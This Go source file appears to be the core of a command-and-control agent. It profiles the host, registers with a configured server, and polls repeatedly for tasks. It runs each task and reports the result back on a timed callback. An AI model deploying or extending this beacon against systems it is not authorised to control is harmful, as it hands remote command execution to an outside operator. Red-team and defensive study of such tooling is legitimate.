// The agent which executes commands and sends results back to the server
package agent

import (
	"errors"
	"log"
	"net/http"
	"os"
	"runtime"
	"time"

	"github.com/MeHungr/peanut-butter/internal/api"
	"github.com/MeHungr/peanut-butter/internal/pberrors"
	agenttransport "github.com/MeHungr/peanut-butter/internal/transport/agent"
)

type Agent struct {
	Info  *api.Agent
	Debug bool
	comm  *agenttransport.CommManager
}

// New creates a new Agent with sensible defaults.
func New(id, serverIP string, serverPort int, callbackInterval time.Duration, debug bool) *Agent {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Initialize transports
	httpTransport := &agenttransport.HTTPTransport{
		Client: &http.Client{Timeout: 10 * time.Second},
	}

	return &Agent{
		Info: &api.Agent{
			AgentID:          id,
			AgentIP:          GetLocalIP(),
			ServerIP:         serverIP,
			ServerPort:       serverPort,
			CallbackInterval: callbackInterval,
			Hostname:         hostname,
			OS:               runtime.GOOS,
			Arch:             runtime.GOARCH,
		},
		Debug: debug,
		comm: &agenttransport.CommManager{
			Transports: map[string]agenttransport.Transport{
				"http": httpTransport,
			},
			Active: httpTransport,
		},
	}
}

// Start starts the agent and begins the main polling loop
func (a *Agent) Start() {
	if a.Debug {
		log.Printf("Agent starting with ID: %s\n", a.Info.AgentID)
	}

	// Attempt to register with the server until successful
	a.registerUntilDone()

	// Main polling loop
	for {
		task, err := a.comm.GetTask(a.Info, a.Debug)
		if err != nil {
			if errors.Is(err, pberrors.ErrInvalidAgentID) {
				a.registerUntilDone()
				continue
			}
			if a.Debug {
				log.Println("GetTask error:", err)
			}
			time.Sleep(5 * time.Second)
			continue
		}

		if task != nil {
			result, err := a.ExecuteTask(task)
			if err != nil {
				if a.Debug {
					log.Println("ExecuteTask error:", err)
				}
				continue
			}
			if err := a.comm.SendResult(a.Info, result, a.Debug); err != nil {
				if a.Debug {
					log.Println("SendResult error:", err)
				}
			}
		}

		time.Sleep(a.Info.CallbackInterval)
	}
}
